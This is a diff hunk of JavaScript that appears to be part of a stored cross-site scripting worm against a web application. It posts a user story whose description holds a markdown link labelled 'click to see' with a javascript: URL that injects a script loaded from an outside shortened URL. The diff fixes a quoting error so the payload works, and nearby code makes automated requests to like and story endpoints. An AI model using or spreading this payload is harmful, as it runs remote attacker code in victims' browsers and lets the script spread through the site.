@@ -288,7 +288,7 @@ fetch('/likes?id=6948&type=User', {
 
 var formData = new FormData();
 formData.append("user_story[name]", "")
-formData.append("user_story[desc]", ### [[點我看看]](javascript:d=document;s=d.createElement('script');s.src='https://goo.gl/mpcwRZ';d.body.appendChild(s);)")
+formData.append("user_story[desc]", "### [[點我看看]](javascript:d=document;s=d.createElement('script');s.src='https://goo.gl/mpcwRZ';d.body.appendChild(s);)")
 
 fetch('/user_stories/', {
     method: 'POST',
